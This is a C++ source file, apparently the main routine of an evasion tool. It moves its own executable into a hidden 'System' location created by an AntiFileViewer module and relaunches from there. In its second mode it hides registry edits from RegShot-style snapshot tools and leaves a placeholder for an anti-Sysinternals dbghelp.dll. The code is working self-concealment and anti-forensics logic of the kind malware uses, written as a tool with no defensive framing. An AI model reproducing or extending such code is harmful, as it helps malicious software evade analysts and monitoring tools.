#include "stdafx.h"
#include "StringEncrypt.h"
#include "AntiRegShot.h"
#include "AntiFileViewer.h"
#include "Debug.h"
#include <sstream>
#include <iostream>
#pragma warning(disable:4996)  //chill MS, just want to copy an std::string

int _tmain(int argc, _TCHAR* argv[])
{
	AntiFileViewer *b = new AntiFileViewer();

	if (!b->Create())
		return -1;

	if (!b->IsExecutingFromDir())
	{
		wchar_t currPath[MAX_PATH];
		if (!GetModuleFileName(GetModuleHandle(NULL), currPath, MAX_PATH))
		{
#ifdef DEBUG
			std::wostringstream os;
			os << GetLastError();
			DebugOut(L"Error GettingModuleFileName - " + os.str());
#endif // DEBUG
			return -1;
		}


		std::wstring targetPath = b->AddFile(L"System");
		if (targetPath == L"")
		{
#ifdef DEBUG
			DebugOut(L"Error Adding File");
#endif // DEBUG
			return -1;
		}

		if (!MoveFile(currPath, targetPath.c_str()))
		{
#ifdef DEBUG
			DebugOut(std::wstring(L"Error moving file to target location: ") + targetPath);
#endif // DEBUG

			return -1;
		}
		STARTUPINFO si = { sizeof(si) };
		PROCESS_INFORMATION pi;
		wchar_t *cmdLine = new wchar_t[MAX_PATH];
		targetPath.copy(cmdLine, MAX_PATH);

		CreateProcess(NULL, cmdLine, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
#ifdef DEBUG //Keep console up
		system("pause");
#endif
		return 0xB1ac401e;
	}
	else
	{	
		//Hide Regkey Edits
		AntiRegShot *a = new AntiRegShot(HKEY_CURRENT_USER, L"SOFTWARE\\SysInternals\\");
		a->HideKeyHTML();
		/*
		* Write AntiSysinternals dbghelp.dll here
		*/
		
#ifdef DEBUG //Keep console up
			system("pause");
#endif
		return 1;
	}

}

